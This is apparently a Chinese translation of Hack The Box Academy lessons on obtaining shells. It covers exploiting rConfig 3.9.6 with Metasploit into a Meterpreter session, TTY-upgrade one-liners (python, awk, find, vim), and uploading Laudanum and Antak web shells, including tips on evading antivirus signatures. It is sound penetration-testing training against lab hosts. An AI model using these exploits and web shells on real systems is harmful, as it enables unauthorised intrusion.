CMD shell 是内置于 Windows 中的原始 MS-DOS shell。它用于主机上的基本交互和 IT 操作。可以使用批处理文件实现一些简单的自动化，但仅此而已。PowerShell 的出现是为了扩展 cmd 的功能。PowerShell 既理解 CMD 中使用的原生 MS-DOS 命令，也理解一整套基于 .NET 的新命令。新的自包含模块也可以通过 cmdlet（命令小程序）实现到 PowerShell 中。CMD 提示符处理文本输入和输出，而 PowerShell 使用 .NET 对象进行所有输入和输出。另一个重要的考虑因素是 CMD 不会保留会话期间使用的命令记录，而 PowerShell 会。因此，在隐蔽性的背景下，使用 cmd 执行命令会在主机上留下较少的痕迹。其他潜在问题如 `Execution Policy`（执行策略）和 `User Account Control (UAC)`（用户账户控制）可能会抑制你在主机上执行命令和脚本的能力。这些考虑因素影响 `PowerShell` 但不影响 cmd。另一个需要考虑的重要问题是主机的年龄。如果你登陆到 Windows XP 或更旧的主机上（是的，这仍然可能发生...），PowerShell 是不存在的，所以你唯一的选择将是 cmd。PowerShell 直到 Windows 7 才出现。所以总结一下：

使用 `CMD` 的情况：

- 你在一个较旧的主机上，可能没有安装 PowerShell。
- 当你只需要简单的交互/访问主机时。
- 当你计划使用简单的批处理文件、net 命令或 MS-DOS 原生工具时。
- 当你认为执行策略可能会影响你在主机上运行脚本或其他操作的能力时。

使用 `PowerShell` 的情况：

- 你计划使用 cmdlet 或其他自定义构建的脚本。
- 当你希望与 .NET 对象而不是文本输出交互时。
- 当隐蔽性不是主要考虑因素时。
- 如果你计划与基于云的服务和主机交互。
- 如果你的脚本设置和使用别名。

---

## WSL 和 PowerShell For Linux

Windows Subsystem for Linux（Windows Linux 子系统）是一个强大的新工具，已被引入 Windows 主机，在你的主机中内置了一个虚拟 Linux 环境。我们之所以提到这一点，是因为操作系统的快速变化很可能会带来访问主机的新方式。在编写本模块时，野外出现了几个恶意软件示例，试图通过 WSL 使用 Python3 和 Linux 二进制文件下载和安装载荷到 Windows 主机上。正如这篇[帖子](https://www.bleepingcomputer.com/news/security/new-malware-uses-windows-subsystem-for-linux-for-stealthy-attacks/)中所述，攻击者还使用 Windows 和 Linux 都原生支持的内置 Python 库以及 PowerShell 在主机上执行其他操作。另外需要注意的是，目前任何向 WSL 实例发出或从 WSL 实例发出的网络请求或执行的功能都不会被 Windows 防火墙和 Windows Defender 解析，这使其成为主机上的一个盲点。

同样的问题目前也存在于可以安装在 Linux 操作系统上的 PowerShell Core 中，它继承了许多正常的 PowerShell 功能。这两个概念特别隐蔽，因为到目前为止，关于攻击向量或监视方法的了解还不多。但是，针对这些功能的攻击已被发现可以绕过 AV（Antivirus，杀毒软件）和 EDR（Endpoint Detection and Response，端点检测与响应）检测机制。这些概念对于本模块来说有点高级，但请在未来的模块中关注它们。#linux #shell #hacking [source](https://academy.hackthebox.com/module/115/section/1114)

W3Techs 维护着一项持续的操作系统使用统计[研究](https://w3techs.com/technologies/overview/operating_system)。该研究报告称超过 `70%` 的网站（Web 服务器）运行在基于 Unix 的系统上。对我们来说，这意味着我们可以通过继续增长对 Unix/Linux 的知识以及如何在这些环境中获取 shell 会话来获得显著的收益，从而可能在环境中进一步横向移动。虽然组织使用第三方和云提供商来托管其网站和 Web 应用程序很常见，但许多组织仍然在其网络环境（本地）中的服务器上托管其网站和 Web 应用程序。在这些情况下，我们希望与底层系统建立 shell 会话，以尝试横向移动到内部网络中的其他系统。

---

## 常见考虑因素

正如你现在可能已经注意到的，通过各种方式可以获得与系统的 shell 会话，一种常见的方式是通过应用程序中的漏洞。我们将识别漏洞并发现可用于通过投递载荷获取 shell 的利用程序。在考虑如何在 Unix/Linux 系统上建立 shell 会话时，我们将从考虑以下因素中获益：

- 系统运行的是哪个 Linux 发行版？

- 系统上存在哪些 shell 和编程语言？

- 该系统在其所在的网络环境中承担什么功能？

- 系统托管什么应用程序？

- 是否存在任何已知漏洞？


让我们通过攻击一个运行在 Linux 系统上的易受攻击应用程序来深入了解这个概念。在我们进行时，请记住这些问题并做笔记。你能回答它们吗？

---

## 通过攻击易受攻击的应用程序获取 Shell

与大多数任务一样，我们将使用 `Nmap` 对系统进行初始枚举。

#### 枚举主机

枚举主机

```shell-session
tr01ax@htb[/htb]$ nmap -sC -sV 10.129.201.101

Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 09:09 EDT
Nmap scan report for 10.129.201.101
Host is up (0.11s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 2.0.8 or later
22/tcp   open  ssh      OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 2d:b2:23:75:87:57:b9:d2:dc:88:b9:f4:c1:9e:36:2a (RSA)
|   256 c4:88:20:b0:22:2b:66:d0:8e:9d:2f:e5:dd:32:71:b1 (ECDSA)
|_  256 e3:2a:ec:f0:e4:12:fc:da:cf:76:d5:43:17:30:23:27 (ED25519)
80/tcp   open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34
|_http-title: Did not follow redirect to https://10.129.201.101/
111/tcp  open  rpcbind  2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
443/tcp  open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2021-09-24T19:29:26
|_Not valid after:  2022-09-24T19:29:26
|_ssl-date: TLS randomness does not represent time
3306/tcp open  mysql    MySQL (unauthorized)
```

牢记我们`获取 shell 会话`的目标，我们必须在检查扫描输出后确定一些后续步骤。

`我们能从输出中收集到什么信息？`

考虑到我们可以看到系统在端口 80（`HTTP`）、443（`HTTPS`）、3306（`MySQL`）和 21（`FTP`）上监听，可以合理地假设这是一个托管 Web 应用程序的 Web 服务器。我们还可以看到与 Web 堆栈相关的一些版本号（`Apache 2.4.6` 和 `PHP 7.2.34`）以及系统上运行的 Linux 发行版（`CentOS`）。在决定进一步研究的方向（深入研究某个方向）之前，我们还应该尝试通过 Web 浏览器导航到该 IP 地址，以发现托管的应用程序（如果可能的话）。

#### rConfig 管理工具

![image](https://academy.hackthebox.com/storage/modules/115/rconfig.png)

在这里我们发现了一个名为 [rConfig](https://www.rconfig.com) 的网络配置管理工具。网络和系统管理员使用此应用程序来自动化配置网络设备的过程。一个实际的用例是使用 rConfig 同时在多个路由器上远程配置带有 IP 地址信息的网络接口。这个工具节省了管理员的时间，但如果被攻陷，可能会被用于横向移动到关键的网络设备，这些设备负责在网络中交换和路由数据包。恶意攻击者可能通过 rConfig 控制整个网络，因为它很可能对所有用于配置的网络设备都有管理员访问权限。作为渗透测试人员，发现此应用程序中的漏洞将被视为非常关键的发现。

---

## 发现 rConfig 中的漏洞

仔细查看 Web 登录页面的底部，我们可以看到 rConfig 版本号（`3.9.6`）。我们应该使用这些信息开始寻找任何 `CVE`（Common Vulnerabilities and Exposures，通用漏洞披露）、`公开可用的利用程序`和`概念验证`（`PoCs`）。在我们研究时，请务必仔细查看我们找到的内容并理解它在做什么。我们当然希望它能引导我们获得与目标的 shell 会话。

使用你选择的搜索引擎将会得到一些有希望的结果。我们可以使用关键词：`rConfig 3.9.6 vulnerability`。

![image](https://academy.hackthebox.com/storage/modules/115/rconfigresearch.png)

我们可以看到值得将此作为我们研究的主要重点。同样的思路也可以应用于 Apache 和 PHP 版本，但由于应用程序运行在 Web 堆栈上，让我们看看是否可以通过为 rConfig 中发现的漏洞编写的利用程序获取 shell。

我们还可以使用 Metasploit 的搜索功能来查看是否有任何利用模块可以在目标上获取 shell 会话。

#### 搜索利用模块

搜索利用模块

```shell-session
msf6 > search rconfig

Matching Modules
================

   #  Name                                             Disclosure Date  Rank       Check  Description
   -  ----                                             ---------------  ----       -----  -----------
   0  exploit/multi/http/solr_velocity_rce             2019-10-29       excellent  Yes    Apache Solr Remote Code Execution via Velocity Template
   1  auxiliary/gather/nuuo_cms_file_download          2018-10-11       normal     No     Nuuo Central Management Server Authenticated Arbitrary File Download
   2  exploit/linux/http/rconfig_ajaxarchivefiles_rce  2020-03-11       good       Yes    Rconfig 3.x Chained Remote Code Execution
   3  exploit/unix/webapp/rconfig_install_cmd_exec     2019-10-28       excellent  Yes    rConfig install Command Execution
```

在依赖 MSF 为特定应用程序查找利用模块时，可能会忽略的一个细节是 MSF 的版本。可能存在有用的利用模块未安装在我们的系统上或只是没有通过搜索显示出来。在这些情况下，最好知道 Rapid 7 在其 [GitHub 仓库](https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits)中保存了利用模块的代码。我们可以使用搜索引擎进行更具体的搜索：`rConfig 3.9.6 exploit metasploit github`

此搜索可以指向我们一个名为 `rconfig_vendors_auth_file_upload_rce.rb` 的利用模块的源代码。这个利用程序可以在运行 rConfig 3.9.6 的目标 Linux 主机上获取 shell 会话。如果这个利用程序没有在 MSF 搜索中显示，我们可以从这个仓库复制代码到我们的本地攻击主机，并将其保存在我们本地 MSF 安装引用的目录中。为此，我们可以在攻击主机上执行以下命令：

#### Locate

Locate

```shell-session
tr01ax@htb[/htb]$ locate exploits
```

我们想要在输出中查找与 Metasploit Framework 相关的目录。在 Pwnbox 上，Metasploit 利用模块保存在：

`/usr/share/metasploit-framework/modules/exploits`

我们可以将代码复制到一个文件中，并将其保存在 `/usr/share/metasploit-framework/modules/exploits/linux/http` 中，类似于他们在 GitHub 仓库中存储代码的位置。我们还应该使用命令 `apt update; apt install metasploit-framework` 或你的本地包管理器来保持 msf 的更新。一旦我们找到利用模块并下载它（我们可以使用 wget）或从 Github 复制到适当的目录中，我们就可以使用它来在目标上获取 shell 会话。如果我们在本地系统上将其复制到一个文件中，请确保文件扩展名为 `.rb`。MSF 中的所有模块都是用 Ruby 编写的。

---

## 使用 rConfig 利用程序并获取 Shell

在 msfconsole 中，我们可以使用以下命令手动加载利用程序：

#### 选择利用程序

选择利用程序

```shell-session
msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
```

选择此利用程序后，我们可以列出选项，输入特定于我们网络环境的正确设置，然后启动利用程序。

使用你在本模块中学到的知识来填写与利用程序相关的选项。

#### 执行利用程序

执行利用程序

```shell-session
msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > exploit

[*] Started reverse TCP handler on 10.10.14.111:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] 3.9.6 of rConfig found !
[+] The target appears to be vulnerable. Vulnerable version of rConfig found !
[+] We successfully logged in !
[*] Uploading file 'olxapybdo.php' containing the payload...
[*] Triggering the payload ...
[*] Sending stage (39282 bytes) to 10.129.201.101
[+] Deleted olxapybdo.php
[*] Meterpreter session 1 opened (10.10.14.111:4444 -> 10.129.201.101:38860) at 2021-09-27 13:49:34 -0400

meterpreter > dir
Listing: /home/rconfig/www/images/vendor
========================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  673   fil   2020-09-03 05:49:58 -0400  ajax-loader.gif
100644/rw-r--r--  1027  fil   2020-09-03 05:49:58 -0400  cisco.jpg
100644/rw-r--r--  1017  fil   2020-09-03 05:49:58 -0400  juniper.jpg
```

我们可以从利用过程中概述的步骤看到，此利用程序：

- 检查 rConfig 的易受攻击版本
- 使用 rConfig Web 登录进行身份验证
- 上传基于 PHP 的反向 shell 连接载荷
- 删除载荷
- 为我们留下一个 Meterpreter shell 会话

#### 与 Shell 交互

与 Shell 交互

```shell-session

meterpreter > shell

Process 3958 created.
Channel 0 created.
dir
ajax-loader.gif  cisco.jpg  juniper.jpg
ls
ajax-loader.gif
cisco.jpg
juniper.jpg
```

我们可以进入系统 shell（`shell`）来访问目标系统，就像我们已经登录并打开了一个 CMD.exe 控制台一样。

---

## 使用 Python 生成 TTY Shell

当我们进入系统 shell 时，我们注意到没有显示提示符，但我们仍然可以执行一些系统命令。这是一种通常被称为 `non-tty shell`（非 tty shell）的 shell。这些 shell 功能有限，通常会阻止我们使用诸如 `su`（switch user，切换用户）和 `sudo`（super user do，以超级用户身份执行）等基本命令，如果我们寻求权限提升，我们很可能需要这些命令。发生这种情况是因为载荷是由 apache 用户在目标上执行的。我们的会话是以 apache 用户身份建立的。通常，管理员不会以 apache 用户身份访问系统，因此不需要在与 apache 相关的环境变量中定义 shell 解释器语言。

如果系统上存在 Python，我们可以使用它手动生成 TTY shell。我们始终可以通过在 Linux 系统上输入命令 `which python` 来检查 Python 是否存在。要使用 Python 生成 TTY shell 会话，我们输入以下命令：

#### 交互式 Python

交互式 Python

```shell-session
python -c 'import pty; pty.spawn("/bin/sh")'

sh-4.2$
sh-4.2$ whoami
whoami
apache
```

此命令使用 python 导入 [pty 模块](https://docs.python.org/3/library/pty.html)，然后使用 `pty.spawn` 函数执行 `bourne shell 二进制文件`（`/bin/sh`）。我们现在有了一个提示符（`sh-4.2$`）并可以访问更多系统命令，可以随意在系统中移动。#shell #hacking #find #awk #perl #python #vim [source](https://academy.hackthebox.com/module/115/section/1117)

# 生成交互式 Shell

---

在上一节的末尾，我们与目标建立了一个 shell 会话。最初，我们的 shell 受到限制（有时被称为 jail shell，囚禁 shell），所以我们使用 python 生成了一个 TTY bourne shell 来让我们访问更多命令和一个可以使用的提示符。随着我们在 Hack The Box 上进行更多练习以及在真实世界的任务中，这种情况很可能会越来越多地出现。

有时我们可能会登陆到一个受限 shell 的系统上，而 Python 并未安装。在这些情况下，最好知道我们可以使用几种不同的方法来生成交互式 shell。让我们来看看其中一些。

请注意，每当我们看到 `/bin/sh` 或 `/bin/bash` 时，也可以将其替换为该系统上存在的与 shell 解释器语言相关联的二进制文件。在大多数 Linux 系统上，我们可能会遇到系统原生存在的 `bourne shell`（`/bin/sh`）和 `bourne again shell`（`/bin/bash`）。

---

## /bin/sh -i

此命令将以交互模式（`-i`）执行路径中指定的 shell 解释器。

#### 交互式

交互式

```shell-session
/bin/sh -i
sh: no job control in this shell
sh-4.2$
```

---

## Perl

如果系统上存在编程语言 [Perl](https://www.perl.org)，这些命令将执行指定的 shell 解释器。

#### Perl 转 Shell

Perl To Shell

```shell-session
perl —e 'exec "/bin/sh";'
```

Perl To Shell

```shell-session
perl: exec "/bin/sh";
```

上面的命令应该从脚本中运行。

---

## Ruby

如果系统上存在编程语言 [Ruby](https://www.ruby-lang.org/en/)，此命令将执行指定的 shell 解释器：

#### Ruby 转 Shell

Ruby To Shell

```shell-session
ruby: exec "/bin/sh"
```

上面的命令应该从脚本中运行。

---

## Lua

如果系统上存在编程语言 [Lua](https://www.lua.org)，我们可以使用 `os.execute` 方法，通过下面的完整命令执行指定的 shell 解释器：

#### Lua 转 Shell

Lua To Shell

```shell-session
lua: os.execute('/bin/sh')
```

上面的命令应该从脚本中运行。

---

## AWK

[AWK](https://man7.org/linux/man-pages/man1/awk.1p.html) 是一种类 C 的模式扫描和处理语言，存在于大多数 UNIX/Linux 系统上，被开发人员和系统管理员广泛用于生成报告。它也可以用于生成交互式 shell。这在下面的简短 awk 脚本中展示：

#### AWK 转 Shell

AWK To Shell

```shell-session
awk 'BEGIN {system("/bin/sh")}'
```

---

## Find

[Find](https://man7.org/linux/man-pages/man1/find.1.html) 是一个存在于大多数 Unix/Linux 系统上的命令，广泛用于使用各种条件搜索文件和目录。它也可以用于执行应用程序和调用 shell 解释器。

#### 使用 Find 获取 Shell

Using Find For A Shell

```shell-session
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```

find 命令的这种用法是搜索 `-name` 选项后列出的任何文件，然后执行 `awk`（`/bin/awk`）并运行我们在 awk 部分讨论的相同脚本来执行 shell 解释器。

---

## 使用 Exec 启动 Shell

Using Find For A Shell

```shell-session
find . -exec /bin/sh \; -quit
```

find 命令的这种用法使用 execute 选项（`-exec`）直接启动 shell 解释器。如果 `find` 找不到指定的文件，则不会获得 shell。

---

## VIM

是的，我们可以在流行的命令行文本编辑器 `VIM` 中设置 shell 解释器语言。这是一种非常小众的情况，我们需要使用这种方法，但以防万一知道这个还是很好的。

#### Vim 转 Shell

Vim To Shell

```shell-session
vim -c ':!/bin/sh'
```

#### Vim 逃逸

Vim Escape

```shell-session
vim
:set shell=/bin/sh
:shell
```

---

## 执行权限注意事项

除了了解上面列出的所有选项外，我们还应该注意 shell 会话帐户的权限。我们可以随时尝试运行此命令来列出我们帐户对任何给定文件或二进制文件的文件属性和权限：

#### 权限

Permissions

```shell-session
ls -la <path/to/fileorbinary>
```

我们还可以尝试运行此命令来检查我们登录的帐户具有哪些 `sudo` 权限：

#### Sudo -l

Sudo -l

```shell-session
sudo -l
Matching Defaults entries for apache on ILF-WebSrv:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User apache may run the following commands on ILF-WebSrv:
    (ALL : ALL) NOPASSWD: ALL
```

上面的 sudo -l 命令需要一个稳定的交互式 shell 才能运行。如果你不在完整的 shell 中或处于不稳定的 shell 中，可能不会得到任何返回结果。考虑权限不仅可以让我们看到可以执行哪些命令，还可以开始让我们了解允许我们进行权限提升（privilege escalation）的潜在向量。#shell #webshell #hacking [source](https://academy.hackthebox.com/module/115/section/1119)


---

在我们学习和积极参与渗透测试实践的过程中，几乎可以肯定会遇到 Web 服务器。世界上大部分软件服务正在转向基于 Web 的平台，可以使用 Web 浏览器和 HTTP/S 通过万维网访问。只需考虑我们现在所在的网站。它完全在浏览器中，可以使用任何连接互联网的设备从世界任何地方访问。现代娱乐媒体如`视频游戏`、`音乐`和`视频流`可以通过浏览器和应用程序访问。这意味着随着时间的推移，我们将越来越多地针对 Web 应用程序。

此外，在外部渗透测试期间，我们经常发现客户的边界网络已经过良好的加固。他们不会暴露易受攻击的服务，如 SMB 或我们过去经常遇到的其他元素。这些元素现在我们主要在内部渗透测试期间预期。在我们的外部渗透测试期间，我们最常通过 Web 应用程序攻击（文件上传攻击、SQL 注入、RFI/LFI（远程/本地文件包含）、命令注入等）、密码喷洒（针对 RDS、VPN 门户、Citrix、OWA 和其他使用 Active Directory 身份验证的应用程序）和社会工程来"进入"（在内部网络中获得立足点）。

Web 应用程序通常是我们在外部网络评估中看到的大部分暴露内容，通常呈现出巨大的攻击面。我们可能会发现公开可用的文件上传表单，让我们直接上传 PHP、JSP 或 ASP.NET Web shell。经过身份验证的测试期间可能存在某些功能，或者我们个人最喜欢的自注册功能，我们可以在用户个人资料图片上传区域上传 Web shell（绕过客户端检查后）。我们还可能遇到 Tomcat、Axis2 或 WebLogic 等应用程序，它们允许你通过 WAR 文件部署 JSP 代码作为其功能的一部分。我们甚至可能发现一个配置错误的 FTP 服务，允许直接将文件上传到服务器的 webroot。还有许多其他方式可以上传 Web shell，这超出了本模块的范围。一旦我们识别出无限制的上传漏洞或配置错误，接下来该怎么办？

---

## 什么是 Web Shell？

`Web shell` 是一种基于浏览器的 shell 会话，我们可以使用它与 Web 服务器的底层操作系统进行交互。同样，要通过 Web shell 获得远程代码执行，我们必须首先找到可以给我们文件上传能力的网站或 Web 应用程序漏洞。大多数 Web shell 是通过将用 Web 语言编写的有效载荷（payload）上传到目标服务器来获得的。我们上传的有效载荷应该在浏览器中为我们提供远程代码执行能力。接下来的部分和挑战将主要集中在通过浏览器中的 Web shell 执行命令。但是，重要的是要知道，仅依赖 Web shell 与系统交互可能是不稳定和不可靠的，因为某些 Web 应用程序被配置为在一定时间后删除文件上传。为了在系统上实现持久性（persistence），在许多情况下，这是通过 Web 应用程序获得远程代码执行的初始方式，然后我们可以使用它升级到更具交互性的反向 shell。

在接下来的几个部分中，我们将学习和试验各种 Web shell，这些 shell 允许我们通过 Web 浏览器与 Web 服务器的底层操作系统进行交互。#webshell #shell #laudanum #hacking [source](https://academy.hackthebox.com/module/115/section/1122)

---

Laudanum 是一个现成文件的仓库，可用于注入到受害者并通过反向 shell 接收访问权限、直接从浏览器在受害者主机上运行命令等。该仓库包括许多不同 Web 应用程序语言的可注入文件，包括 `asp、aspx、jsp、php` 等。这是任何渗透测试中必备的工具。如果你使用自己的虚拟机，Laudanum 默认内置于 Parrot OS 和 Kali 中。对于任何其他发行版，你可能需要下载一份副本来使用。你可以在[这里](https://github.com/jbarcia/Web-Shells/tree/master/laudanum)获取。让我们来检查 Laudanum 并看看它是如何工作的。

---

## 使用 Laudanum

Laudanum 文件可以在 `/usr/share/webshells/laudanum` 目录中找到。对于 Laudanum 中的大多数文件，你可以按原样复制它们并将它们放置在受害者上需要运行的位置。对于特定文件（如 shell），你必须首先编辑文件以插入你的`攻击`主机 IP 地址，以确保你可以访问 Web shell 或在使用反向 shell 的情况下接收回调。在使用不同文件之前，请务必阅读内容和注释以确保采取正确的操作。

---

## Laudanum 演示

现在我们了解了 Laudanum 是什么以及它是如何工作的，让我们看看我们在实验室环境中发现的一个 Web 应用程序，看看是否可以运行 Web shell。如果你希望跟随这个演示，你需要在攻击虚拟机或 Pwnbox 的 `/etc/hosts` 文件中为我们正在攻击的主机添加一个条目。该条目应该是：`<target ip> status.inlanefreight.local`。完成后，只要你在 VPN 上或使用 Pwnbox，你就可以玩转和探索这个演示。

#### 移动副本以进行修改

Move a Copy for Modification

```shell-session
tr01ax@htb[/htb]$ cp /usr/share/webshells/laudanum/aspx/shell.aspx /home/tester/demo.aspx
```

将你的 IP 地址添加到第 `59` 行的 `allowedIps` 变量中。进行你希望的任何其他更改。从文件中删除 ASCII 艺术和注释可能是谨慎的做法。有效载荷中的这些项目通常会被签名识别，并可能向防御者/杀毒软件发出你正在做什么的警报。

#### 修改 Shell 以供使用

![image](https://academy.hackthebox.com/storage/modules/115/modify-shell.png)

我们正在利用状态页面底部的上传功能（`绿色箭头`）使其工作。选择你的 shell 文件并点击上传。如果成功，它应该打印出文件保存的路径（黄色箭头）。使用上传功能。成功后会打印出文件的位置，导航到它。

#### 利用上传功能

![image](https://academy.hackthebox.com/storage/modules/115/laud-upload.png)

上传成功后，你需要导航到你的 Web shell 以使用其功能。下图向我们展示了如何做到这一点。从上一张图片可以看到，我们的 shell 被上传到了 `\\files\` 目录，名称保持不变。情况并不总是这样。你可能会遇到一些在上传时随机化文件名的实现，它们没有公共 files 目录或任何数量的其他潜在安全措施。目前，我们很幸运情况并非如此。对于这个特定的 Web 应用程序，我们的文件去了 `status.inlanefreight.local\\files\demo.aspx`，需要我们使用该路径中的 \ 而不是正常的 / 来浏览上传。一旦你这样做，你的浏览器将在你的 URL 窗口中将其清理为 `status.inlanefreight.local//files/demo.aspx`。

#### 导航到我们的 Shell

![image](https://academy.hackthebox.com/storage/modules/115/laud-nav.png)

我们现在可以利用上传的 Laudanum shell 向主机发出命令。我们可以在示例中看到运行了 `systeminfo` 命令。

#### Shell 成功

![image](https://academy.hackthebox.com/storage/modules/115/laud-success.png)#shell #webshell #antak #hacking [source](https://academy.hackthebox.com/module/115/section/1124)

---

## ASPX 和快速学习技巧

在深入 aspx shell 概念和练习之前，我们应该花时间介绍一个学习资源，它可以帮助强化这里 HTB Academy 中涵盖的大部分概念。偶尔仅使用一种学习方法来可视化概念可能是一个挑战。用观看演示和动手实践来补充阅读是很好的，就像我们迄今为止所做的那样。视频演练可以是学习概念的绝佳方式，而且可以随意观看（吃午饭、躺在床上、坐在沙发上等）。一个很好的学习资源是 `IPPSEC` 的博客网站 [ippsec.rocks](https://ippsec.rocks/?#)。该网站是一个强大的学习工具。以 Web shell 的概念为例。我们可以使用他的网站输入我们想要学习的概念，如 aspx。

![IPPSEC Rocks](https://academy.hackthebox.com/storage/modules/115/ippsecrocks.png)

他的网站会爬取他在 YouTube 上发布的每个视频的描述，并推荐与该关键词相关的时间戳。当我们点击其中一个链接时，它会带我们到视频中演示这个概念的那个部分。这就像一个学习黑客技能的搜索引擎。为了对 aspx Web shell 有一个很好的基本理解，让我们观看 IPPSEC 对已退役靶机 [Cereal](https://www.youtube.com/watch?v=04ZBIioD5pA&t=4677s) 的演示的简短部分。链接应该从 1 小时 17 分钟开始。从 1 小时 17 分钟到 1 小时 20 分钟观看。

我们会注意到他通过 FTP 上传了文件，然后使用 Web 浏览器导航到该文件。这使他能够向底层 Windows 操作系统发送命令并接收输出。

`aspx 是如何工作的？`

---

## ASPX 解释

`Active Server Page Extended`（`ASPX`，活动服务器页面扩展）是为 [Microsoft 的 ASP.NET 框架](https://docs.microsoft.com/en-us/aspnet/overview)编写的文件类型/扩展名。在运行 ASP.NET 框架的 Web 服务器上，可以为用户生成用于输入数据的 Web 表单页面。在服务器端，信息将被转换为 HTML。我们可以通过使用基于 ASPX 的 Web shell 来控制底层 Windows 操作系统来利用这一点。让我们通过使用 Antak Webshell 亲身体验这一点。

---

## Antak Webshell

Antak 是一个内置于 ASP.Net 中的 Web shell，包含在 [Nishang 项目](https://github.com/samratashok/nishang)中。Nishang 是一个攻击性 PowerShell 工具集，可以为渗透测试的任何部分提供选项。由于我们目前专注于 Web 应用程序，让我们把目光放在 `Antak` 上。Antak 使用 PowerShell 与主机交互，使其非常适合在 Windows 服务器上获取 Web shell。用户界面甚至采用了 PowerShell 的主题风格。是时候深入并试验 Antak 了。

---

## 使用 Antak

Antak 文件可以在 `/usr/share/nishang/Antak-WebShell` 目录中找到。

```shell-session
tr01ax@htb[/htb]$ ls /usr/share/nishang/Antak-WebShell

antak.aspx  Readme.md
```

Antak Web shell 的功能类似于 Powershell 控制台。但是，它会将每个命令作为新进程执行。它还可以在内存中执行脚本并对你发送的命令进行编码。作为 Web shell，Antak 是一个相当强大的工具。

---

## Antak 演示

现在我们了解了 Antak 是什么以及它是如何工作的，让我们在 Laudanum 部分的同一个 Web 应用程序上测试它。如果你希望跟随这个演示，你需要在攻击虚拟机或 Pwnbox 的 `/etc/hosts` 文件中为我们正在攻击的主机添加一个条目。该条目应该是：`<target ip> status.inlanefreight.local`。完成后，只要你在 VPN 上或使用 Pwnbox，你也可以玩转和探索这个演示。

#### 移动副本以进行修改

Move a Copy for Modification

```shell-session
tr01ax@htb[/htb]$ cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/administrator/Upload.aspx
```

确保设置访问 Web shell 的凭据。修改`第 14 行`，添加用户（绿色箭头）和密码（橙色箭头）。当你浏览到你的 Web shell 时，这会起作用，很像 Laudanum。这可以帮助确保随机的人不能偶然使用 shell，使你的操作更加安全。从文件中删除 ASCII 艺术和注释可能是谨慎的做法。有效载荷中的这些项目通常会被签名识别，并可能向防御者/杀毒软件发出你正在做什么的警报。

#### 修改 Shell 以供使用

![image](https://academy.hackthebox.com/storage/modules/115/antak-changes.png)

为了演示该工具，我们将其上传到我们用于 Laudanum 的同一个状态门户。该主机是一个 Windows 主机，所以我们的 shell 应该可以与 PowerShell 一起正常工作。上传文件，然后导航到该页面使用。它会给你一个用户和密码提示。请记住，对于这个 Web 应用程序，文件存储在 `\\files\` 目录中。当你导航到 `upload.aspx` 文件时，你应该看到如下所示的提示。

#### Shell 成功

![image](https://academy.hackthebox.com/storage/modules/115/antak-creds-prompt.png)

如下图所示，如果我们的凭据输入正确，我们将获得访问权限。

![image](https://academy.hackthebox.com/storage/modules/115/antak-success.png)

现在我们有了访问权限，我们可以利用 PowerShell 命令来导航和对主机执行操作。我们可以从 Antak shell 窗口发出基本命令、上传和下载文件、编码和执行脚本等等（下面的绿色箭头）。这是利用 Webshell 向我们的命令与控制（C2）平台传递回调的绝佳方式。我们可以通过上传功能上传有效载荷，或使用 PowerShell 一行命令为我们下载并执行 shell。如果你不确定从哪里开始，在提示窗口中发出命令 `help`（下面的橙色箭头）。

#### 发出命令

![image](https://academy.hackthebox.com/storage/modules/115/antak-commands.png)#shell #webshell #php #hacking [source](https://academy.hackthebox.com/module/115/section/1120)

---

超文本预处理器或 [PHP](https://www.php.net) 是一种开源通用脚本语言，通常用作为网站提供支持的 Web 堆栈的一部分。在撰写本文时（2021 年 10 月），PHP 是最流行的`服务器端编程语言`。根据 W3Techs 进行的[最新调查](https://w3techs.com/technologies/details/pl-php)，"PHP 被我们所知的所有服务器端编程语言网站中的 `78.6%` 使用"。

让我们考虑一个在登录 Web 表单上填写用户帐户和密码字段的实际示例。

#### PHP 登录页面

![image](https://academy.hackthebox.com/storage/modules/115/rconfig.png)

还记得本模块前面的 rConfig 服务器吗？它使用 PHP。我们可以看到一个 `login.php` 文件。所以当我们填写用户名和密码字段后选择登录按钮时，该信息会在服务器端使用 PHP 进行处理。知道 Web 服务器正在使用 PHP 给我们渗透测试人员一个线索，我们可能会在这个系统上获得一个基于 PHP 的 Web shell。让我们亲自体验这个概念。

---

## 亲自使用基于 PHP 的 Web Shell

由于 PHP 在服务器端处理代码和命令，我们可以使用预先编写的有效载荷通过浏览器获取 shell 或与我们的攻击机建立反向 shell 会话。在这种情况下，我们将利用 rConfig 3.9.6 中的漏洞手动上传 PHP Web shell 并与底层 Linux 主机进行交互。除了前面提到的所有功能外，rConfig 还允许管理员添加网络设备并按供应商对其进行分类。继续使用默认凭据（admin:admin）登录 rConfig，然后导航到 `Devices` > `Vendors` 并点击 `Add Vendor`。

#### 供应商选项卡

![image](https://academy.hackthebox.com/storage/modules/115/vendors_tab.png)

